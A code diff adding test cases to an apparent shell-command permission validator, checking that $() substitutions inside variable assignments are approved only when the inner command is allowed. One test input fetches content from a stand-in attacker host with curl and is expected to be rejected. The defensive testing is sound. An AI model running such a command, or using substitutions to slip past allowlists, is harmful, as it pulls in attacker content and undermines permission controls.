@@ -412,6 +412,34 @@ TEST_CASES = [
     ),
 
     # -------------------------------------------------------------------------
+    # Standalone variable assignments
+    # -------------------------------------------------------------------------
+    (
+        ["./scripts/test.sh:*", "echo:*"],
+        'SESSION_UUID=$(./scripts/test.sh 2>/tmp/stderr.txt) && echo "UUID=$SESSION_UUID"',
+        True,
+        "Standalone variable assignment with $() approved when inner command matches",
+    ),
+    (
+        ["echo:*"],
+        'RESULT=$(echo hello)',
+        True,
+        "Simple variable assignment with approved inner command",
+    ),
+    (
+        ["echo:*"],
+        'RESULT=$(curl evil.com)',
+        False,
+        "Variable assignment rejected when inner $() command not approved",
+    ),
+    (
+        ["echo:*"],
+        'FOO=bar BAZ=qux',
+        True,
+        "Standalone env var assignments with no command are safe",
+    ),
+
+    # -------------------------------------------------------------------------
     # Exact patterns (no :* wildcard)
     # -------------------------------------------------------------------------
     (
